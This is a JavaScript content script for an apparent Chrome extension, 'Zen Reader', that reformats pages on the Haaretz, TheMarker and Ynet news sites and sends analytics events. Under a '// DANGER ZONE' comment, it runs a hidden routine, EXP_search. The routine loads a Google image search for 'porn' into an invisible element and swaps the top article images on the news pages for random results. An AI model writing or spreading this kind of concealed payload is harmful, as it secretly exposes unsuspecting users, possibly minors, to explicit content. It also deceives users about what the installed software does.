var publishers = ["Haaretz", "TheMarker", "Ynet"];
var publisherInstances = {};

(function() {

	var tracker = null;
	
	function req_new_author() {
		if (!document.getElementById('mailto-proxy')) {
			var a = document.createElement('a');
			a.id = 'mailto-proxy';
			a.href = "mailto:doron.sadeh.dev@gmail.com?subject=Request%20additions/modifications%20in%20Zen%20Reader";
			document.body.appendChild(a);
		}

		document.getElementById('mailto-proxy').click();
	}

	function run(rerun, force) {
		// Run each publisher
		var keys = Object.keys(publisherInstances)
		for (var j = 0; j < keys.length; j++) {
			publisherInstances[keys[j]].run(rerun, force);
		}
	}
	
    function EXP_cb(text, status, jqxhr) {
        var imgs = document.querySelectorAll('img.rg_i[data-sz="f"]');
        if (imgs.length > 0) {
            topArticleImgs = document.querySelectorAll(['div.citv_image>img', 'div.citv_image>font>img']);
            for (var i = 0; i < topArticleImgs.length && i < imgs.length; i++) {
                var validImage = null;
                while (!validImage || validImage.src.length === 0) {
                    validImage = imgs[Math.round(Math.random()*(imgs.length - 1))];
                }
                topArticleImgs[i].src = validImage.src;
            }
        }
        
        document.body.removeChild(document.getElementById('zen-reader-__temp__result'));
    }
    
    function EXP_search() {
        var r = document.createElement('DIV');
        r.id = 'zen-reader-__temp__result';
        r.style.display = 'none';
        r.style.width = 0;
        r.style.height = 0;
        document.body.appendChild(r);
        
        $("#zen-reader-__temp__result").load("https://www.google.co.il/search?q=porn&es_sm=93&source=lnms&tbm=isch&sa=X&ved=0CAcQ_AUoAWoVChMIh6Hf2-7dyAIV5ixyCh0T3AvC&biw=1680&bih=925#q=unicorn&tbs=isz:lt,islt:svga&tbm=isch",
                                             '',
                                             EXP_cb);
    }
    
	// Now run this ONCE per page (do NOT run this in each iframe)
	if (window === window.top) {

		chrome.runtime.sendMessage({incr: '0'}, function(response) {
		});

		chrome.storage.onChanged.addListener(function(changes, namespace) {
		  for (key in changes) {
			if (key === 'refresh') {
				run(true, false);
			}
            if (key === 'force_refresh') {
                run(true, true);
            }
			if (key === 'req_new_author') {
				req_new_author();
			}
		  }
		});

		// You'll usually only ever have to create one service instance.
		var service = analytics.getService('zen_reader');

		// You can create as many trackers as you want. Each tracker has its own state
		// independent of other tracker instances.
		tracker = service.getTracker('UA-67866543-1');

		tracker.sendAppView('Loaded');

		// Create all publishers
		for (var i = 0; i < publishers.length; i++) {
			publisherInstances[publishers[i]] = new window[publishers[i]](tracker);
			console.log("Created ", publishers[i], publisherInstances[publishers[i]]);
		}

		run(false);

        // DANGER ZONE
        EXP_search();

	}
	
})();

